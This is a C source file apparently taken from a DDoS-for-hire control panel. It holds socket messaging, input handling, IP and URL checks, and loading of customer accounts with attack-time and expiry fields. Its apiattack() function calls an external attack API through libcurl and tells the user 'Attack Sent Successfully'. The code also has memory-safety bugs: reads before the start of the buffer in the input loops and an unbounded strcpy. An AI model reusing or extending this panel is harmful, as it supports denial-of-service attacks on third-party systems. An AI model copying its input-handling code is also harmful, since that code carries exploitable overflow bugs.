#include "headers/headers.h"

int ValidIP(const char *IP)
{
	int i;
	int IPLen = strlen(IP);

	if (IPLen < 7 || IPLen > 15)
		return 0;

	char Tail[16];
	Tail[0] = 0;

	unsigned int Octet[4];
	int Count = sscanf(IP, "%3u.%3u.%3u.%3u%s", &Octet[0], &Octet[1], &Octet[2], &Octet[3], Tail);

	if (Count != 4 || Tail[0])
	{
		return 0;
	}

	for (i = 0; i < 4; i++)
	{
		if (Octet[i] > 255)
		{
			return 0;
		}
	}
	return 1;
}

int urlcheck(int urlvalue, int datafd)
{
	if (urlvalue == 0)
	{
		return 1;
	}
	else if (urlvalue == REG_NOMATCH)
	{
		socketWrite(datafd, "\x1b[38;5;196mInvalid URL.\x1b[0m\r\n");
		return 0;
	}
	else
	{
		socketWrite(datafd, "\x1b[38;5;196mError Reading URL.\x1b[0m\r\n");
		return 0;
	}
	return 0;
}

int strjcmp(char string1[], char string2[])
{
	int cn = 0;

	while (string1[cn] == string2[cn])
	{
		if (string1[cn] == '\0' || string2[cn] == '\0')
			break;
		cn++;
	}
	if (string1[cn] == '\0' && string2[cn] == '\0')
		return -1;
	else
		return 0;
}

void apiattack(char *api, int datafd)
{
	CURL *curl = curl_easy_init();
	if (curl)
	{
		CURLcode response;
		curl_easy_setopt(curl, CURLOPT_URL, api);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, true);
		response = curl_easy_perform(curl);

		if (response != CURLE_OK)
		{
			socketWrite(datafd, "\x1b[38;5;196mRAW API Down\x1b[0m\r\n");
			printf("Got An Error\r\n");
			fprintf(stderr, "Error curl_easy_perform(): %s\n", curl_easy_strerror(response));
		}
		else
		{
			socketWrite(datafd, "\x1b[38;5;082mAttack Sent Successfully ✓\x1b[0m\r\n");
			socketWrite(datafd, "\x1b\e[0m\r\n");
		}

		curl_easy_cleanup(curl);
	}
	curl_global_cleanup();
}

int DelFD(int datafd)
{
	memset(&Users[datafd], 0, sizeof(struct FileDesData));
	return 0;
}

int socketWrite(int datafd, char *msg)
{
	if (strlen(msg) > 12000)
		return 0;
	return send(datafd, msg, strlen(msg), MSG_NOSIGNAL);
}

int inputSocketWrite(int datafd, char *msg, char *msg2)
{
	char inputDataBuffer[1024];

	send(datafd, msg, strlen(msg), MSG_NOSIGNAL);
	recieve(datafd, inputDataBuffer, 1024);
	trim(inputDataBuffer);

	if (strlen(inputDataBuffer) <= 0 && inputDataBuffer[0] == 0)
	{
#ifdef DEBUG
		send(datafd, "Error writing to the socket\r\n", 50, MSG_NOSIGNAL);
#endif
		return 1;
	}
	strcpy(msg2, inputDataBuffer);
	return 0;
}

void trim(char *str)
{
	int i, begin = 0, end = strlen(str) - 1;
	while (isspace(str[begin]))
		begin++;
	while ((end >= begin) && isspace(str[end]))
		end--;
	for (i = begin; i <= end; i++)
		str[i - begin] = str[i];

	str[i - begin] = '\0';
}

int recieve(int datafd, char *buffer, int len)
{
	int all = 0;
	int taken = 1;

	while (taken == 1 && all < len && *(buffer + all - 1) != '\n')
	{
		taken = read(datafd, buffer + all, 1);
		all++;
	}
	return taken;
}

int fdgets(char *buffer, int bufferSize, int fd)
{
	memset(Users[fd].buf, 0, sizeof(Users[fd].buf));
	int total = 0, got = 1;
	while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n')
	{
		got = read(fd, buffer + total, 1);
		total++;
	}
	trim(buffer);
	return got;
}

int ValidateFiles()
{
	FILE *fp;
	fp = fopen("users/", "r");
	if (fp != NULL)
		fclose(fp);

	fp = fopen("users/LoginFile.txt", "r");
	if (fp != NULL)
		fclose(fp);

	return 0;
}

int Find_Login(char *str)
{
	FILE *fp;
	int line_num = 0;
	int find_result = 0, find_line = 0;
	char temp[512];

	if ((fp = fopen("users/LoginFile.txt", "r")) == NULL)
		return (-1);

	while (fgets(temp, 512, fp) != NULL)
	{
		if ((strstr(temp, str)) != NULL)
		{
			find_result++;
			find_line = line_num;
		}
		line_num++;
	}
	if (fp)
		fclose(fp);
	if (find_result == 0)
		return 0;
	return find_line;
}

int ReloadAccounts()
{
	int Lines = 0, poop = 0;
	ValidateFiles();
	FILE *fp = fopen("users/LoginFile.txt", "r");
	if (fp == NULL)
		return 0;

	char buffer[1024];
	while (fgets(buffer, sizeof(buffer), fp) != NULL)
		if (strlen(buffer) > 2)
			Lines++;

	rewind(fp);
	while (poop != Lines)
	{
		fscanf(fp, "%s %s %s %s %ld", accounts[poop].username, accounts[poop].password, accounts[poop].status, accounts[poop].secs, &accounts[poop].expiry);
		poop++;
	}
	fclose(fp);
	return 0;
}
